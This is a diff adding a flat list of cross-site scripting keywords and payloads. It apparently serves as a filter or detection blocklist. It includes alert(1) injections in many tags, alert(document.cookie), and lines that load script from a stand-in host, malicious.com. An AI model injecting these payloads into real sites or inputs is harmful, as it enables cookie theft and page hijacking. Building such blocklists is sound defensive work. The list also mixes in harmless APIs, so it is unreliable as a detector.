@@ -1,0 +1,99 @@
+<script>
+</script>
+javascript:
+onmouseover
+onerror
+onload
+alert(
+document.cookie
+document.write(
+eval(
+window.location
+location.href
+window.location.href
+location.replace(
+src="javascript:
+data:text/html,
+<img src="javascript:alert(1)">
+iframe
+<iframe src="javascript:alert(1)">
+onfocus
+onblur
+onchange
+oninput
+form
+input type="text" onfocus=alert(1)>
+xmlhttprequest
+window.eval(
+setTimeout(
+setInterval(
+document.location
+window.open(
+body onload=alert(1)
+href="javascript:alert(1)"
+document.body.innerHTML
+document.getElementById(
+innerHTML
+outerHTML
+document.write(
+javascript:void(0)
+<object data="javascript:alert(1)">
+onmousedown
+onmouseup
+onkeydown
+onkeyup
+onresize
+onselect
+<base href="javascript:alert(1)">
+<link href="javascript:alert(1)">
+console.log(
+console.dir(
+console.error(
+console.warn(
+<script src=javascript:alert(1)>
+javascript:confirm(
+top.location
+window.document
+parent.location
+window.parent
+eval(unescape(
+script src=
+<style>div{background-image:url(javascript:alert(1))}</style>
+style="background:url(javascript:alert(1))"
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+onbeforeunload
+onafterprint
+onbeforeprint
+onhashchange
+onmessage
+postMessage(
+write
+writestream
+onunload
+window.open("javascript:alert(1)")
+src="data:image/svg+xml;base64,...
+<svg/onload=alert(1)>
+svg xmlns:xlink="http://www.w3.org/1999/xlink"
+<audio src="javascript:alert(1)">
+<video src="javascript:alert(1)">
+eval(String.fromCharCode(
+new Function(
+object data="javascript:eval(alert(1))"
+javascript:window.alert(
+javascript:alert(1)
+expr
+livescript:
+mhtml:file://
+<img src="javascript:eval('alert(1)')">
+alert(document.cookie)
+xlink:href="javascript:alert(1)"
+oncopy
+oncut
+onpaste
+<script type="text/javascript">
+oncontextmenu=alert(1)
+window.onerror=
+document.createElement('script').src='http://malicious.com/xss.js';
+document.getElementsByTagName('script')[0].src='http://malicious.com/xss.js';
+setTimeout(function(){eval('alert(1)')},1)
+eval("window.alert('xss')")
